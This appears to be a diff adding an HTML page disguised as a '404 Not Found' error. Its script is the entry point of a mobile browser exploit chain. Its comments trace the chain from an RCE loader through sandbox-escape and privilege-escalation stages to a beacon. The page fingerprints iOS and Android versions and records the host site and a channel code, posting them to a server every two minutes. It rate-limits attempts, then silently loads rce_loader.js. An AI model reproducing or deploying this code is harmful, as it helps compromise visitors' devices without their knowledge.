@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>404 Not Found</title>
+</head>
+<body>
+<script>
+"use strict";
+// ─────────────────────────────────────────────────────────────
+// B10/boot.html —— 单链唯一入口（自根 /boot.html 全量移植）
+//
+// 相比旧链路（/boot.html 探测 → 等首次 sync 成功 → 800ms → /B10/group.html 再进门禁）：
+//   * 探测、sync 心跳、门禁、引导全部在本页内完成 —— 链内零跳转、零等待
+//   * sync 5s 心跳不再因跳转卸载而死，盘踞整个链条生命周期
+//   * 门禁口径与 group.html 完全一致（PE 锁 + 尝试窗口 + ?force=1）
+//
+// 链路：B10/boot.html →(本页)→ rce_loader.js → rce_worker_18.x → sbx0 → sbx1 → pe_worker.js → /beacon
+// ─────────────────────────────────────────────────────────────
+
+// ── 工具 ──
+function getParam(key) {
+    return new URLSearchParams(location.search).get(key) || '';
+}
+
+// ── 系统检测（含 iOS Safari "Version/x.x" 真实版本校正）──
+function detectDevice() {
+    var ua = navigator.userAgent;
+    var wkm = ua.match(/AppleWebKit\/([\d.]+)/i);
+    var wk  = wkm ? wkm[1] : '';
+
+    var isIOS = /iPhone|iPad|iPod/i.test(ua) ||
+                (/Macintosh/i.test(ua) && navigator.maxTouchPoints > 1); // iPad 桌面模式
+
+    if (isIOS) {
+        // (a) CPU (iPhone) OS 段 —— 兼容模式下可能被冻结为 18_x
+        var osM = ua.match(/OS (\d+)_(\d+)(?:_(\d+))?/i);
+        var osMaj = osM ? parseInt(osM[1], 10) : 0;
+        var osMin = osM ? parseInt(osM[2], 10) : 0;
+        var osPat = osM ? parseInt(osM[3] || 0, 10) : 0;
+
+        // (b) Safari Version 段 —— 通常保留真实版本
+        var vM = ua.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/i);
+        var sfMaj = vM ? parseInt(vM[1], 10) : 0;
+        var sfMin = vM ? parseInt(vM[2], 10) : 0;
+        var sfPat = vM ? parseInt(vM[3] || 0, 10) : 0;
+
+        var major, minor, patch;
+        if (sfMaj > osMaj) { major = sfMaj; minor = sfMin; patch = sfPat; }
+        else               { major = osMaj; minor = osMin; patch = osPat; }
+
+        var v = major + '.' + minor + (patch ? '.' + patch : '');
+        return {
+            type: 'iOS', major: major, minor: minor, patch: patch,
+            version: 'IOS ' + v, wk: wk,
+            os: osMaj ? (osMaj + '.' + osMin) : '—',
+            safari: sfMaj ? (sfMaj + '.' + sfMin) : '—',
+            ua: ua
+        };
+    }
+
+    var am = ua.match(/Android\s+(\d+(?:\.\d+)*)/i);
+    if (am) {
+        var p = am[1].split('.');
+        return { type: 'Android', major: parseInt(p[0], 10),
+                 version: 'Android ' + am[1], wk: wk,
+                 os: am[1], safari: '—', ua: ua };
+    }
+
+    return { type: 'unknown', major: 0, minor: 0,
+             version: getParam('v') || 'unknown', wk: wk,
+             os: '—', safari: '—', ua: ua };
+}
+
+// ── iframe 上下文 ──
+var inIframe = false;
+try { inIframe = window.self !== window.top; } catch (e) { inIframe = true; }
+var refUrl = null;
+try { if (document.referrer) refUrl = new URL(document.referrer); } catch (e) {}
+
+// ── 渠道号：自身 ?c= → 同源父页面 ?c= → referrer 的 ?c= → 默认 1 ──
+function getChannel() {
+    var c = getParam('c');
+    if (c) return c;
+    try {
+        if (inIframe && window.top && window.top.location) {
+            var tc = new URLSearchParams(window.top.location.search).get('c');
+            if (tc) return tc;
+        }
+    } catch (e) {}
+    if (refUrl) {
+        var rc = refUrl.searchParams.get('c');
+        if (rc) return rc;
+    }
+    return '1';
+}
+
+// ── 调用网站：URL ?d= → iframe 父页面域名 → referrer 域名 → 自身域名 ──
+function getHostDomain() {
+    var d = getParam('d');
+    if (d) return d;
+    try {
+        var ao = location.ancestorOrigins;
+        if (ao && ao.length) return new URL(ao[0]).hostname;
+    } catch (e) {}
+    try {
+        if (inIframe && window.top && window.top.location) {
+            return window.top.location.hostname;
+        }
+    } catch (e) {}
+    if (refUrl) return refUrl.hostname;
+    return location.hostname || 'unknown';
+}
+
+// ── 参数 ──
+var device = detectDevice();
+var channelCode   = getChannel();
+var deviceVersion = device.version;
+var domain        = getHostDomain();
+
+var PAYLOAD = { channelCode: channelCode, deviceVersion: deviceVersion, domain: domain };
+var API     = '/api/ip-sync/sync';
+var INTERVAL = 120000;
+
+// ── sync 心跳（fire-and-forget：不阻塞链路启动，2min 持续保活至页面关闭）──
+(function syncLoop() {
+    fetch(API, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify(PAYLOAD),
+        keepalive: true
+    }).catch(function () {});
+    setInterval(function () {
+        try {
+            fetch(API, {
+                method:  'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body:    JSON.stringify(PAYLOAD),
+                keepalive: true
+            }).catch(function () {});
+        } catch (e) {}
+    }, INTERVAL);
+})();
+
+// ── 无需 iOS 版本判断：直接进链（固定 iOS 18 入口）──
+if (false) {
+    // 空 title 页保持 404 观感，静默退出
+} else {
+    // ── 门禁（与 group.html 同口径）──
+    var MAX_TRIES = 5;
+    var PE_TTL_MS = 10 * 60 * 1000;
+    var K_PE = '_x_pe_done';
+    var K_TRY = '_x_try';
+    var K_TRY_TS = '_x_try_ts';
+
+    function lsGet(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
+    function lsSet(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
+    function lsDel(k) { try { localStorage.removeItem(k); } catch (e) {} }
+    function cookieGet(name) {
+        try {
+            var m = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+            return m ? decodeURIComponent(m[1]) : null;
+        } catch (e) { return null; }
+    }
+    function cookieSet(name, val, maxAgeSec) {
+        try {
+            document.cookie = name + '=' + encodeURIComponent(val) +
+                '; Path=/; Max-Age=' + maxAgeSec + '; SameSite=Lax';
+        } catch (e) {}
+    }
+    function cookieDel(name) {
+        try { document.cookie = name + '=; Path=/; Max-Age=0; SameSite=Lax'; } catch (e) {}
+    }
+    function peDoneTs() {
+        var a = parseInt(lsGet(K_PE) || '0', 10) || 0;
+        var b = parseInt(cookieGet(K_PE) || '0', 10) || 0;
+        return Math.max(a, b);
+    }
+    function clearAll() {
+        lsDel(K_PE); lsDel(K_TRY); lsDel(K_TRY_TS); lsDel('_x_ok');
+        cookieDel(K_PE);
+    }
+
+    (function gate() {
+        var force = false;
+        try {
+            lsDel('_x_ok'); // 清历史永久锁
+
+            var q = location.search || '';
+            force = /(?:^|[?&])force=1(?:&|$)/.test(q);
+            if (force) {
+                clearAll();
+                try {
+                    var u = new URL(location.href);
+                    u.searchParams.delete('force');
+                    history.replaceState(null, '', u.pathname + (u.search || '') + (u.hash || ''));
+                } catch (eStrip) {}
+            }
+
+            var now = Date.now();
+            var peTs = peDoneTs();
+            if (peTs && (now - peTs) < PE_TTL_MS && !force) {
+                lsSet(K_PE, String(peTs));
+                cookieSet(K_PE, String(peTs), Math.ceil((PE_TTL_MS - (now - peTs)) / 1000));
+                return; // PE 成功锁：不再重打
+            }
+            if (peTs && (now - peTs) >= PE_TTL_MS) {
+                lsDel(K_PE);
+                cookieDel(K_PE);
+            }
+
+            var tryN = parseInt(lsGet(K_TRY) || '0', 10) || 0;
+            var tryTs = parseInt(lsGet(K_TRY_TS) || '0', 10) || 0;
+            if (tryN > 0 && tryTs && (now - tryTs) >= PE_TTL_MS) {
+                tryN = 0;
+                lsDel(K_TRY);
+                lsDel(K_TRY_TS);
+            }
+            if (tryN >= MAX_TRIES && !force) {
+                return; // 本窗口尝试耗尽
+            }
+
+            tryN += 1;
+            lsSet(K_TRY, String(tryN));
+            if (tryN === 1 || !tryTs) lsSet(K_TRY_TS, String(now));
+        } catch (e) {}
+
+        // ── 引导（相对路径：本页在 /B10/ 下，直接命中 rce_loader.js）──
+        var s = document.createElement('script');
+        s.src = 'rce_loader.js?' + Date.now();
+        document.body.appendChild(s);
+    })();
+}
+</script>
+</body>
+</html>
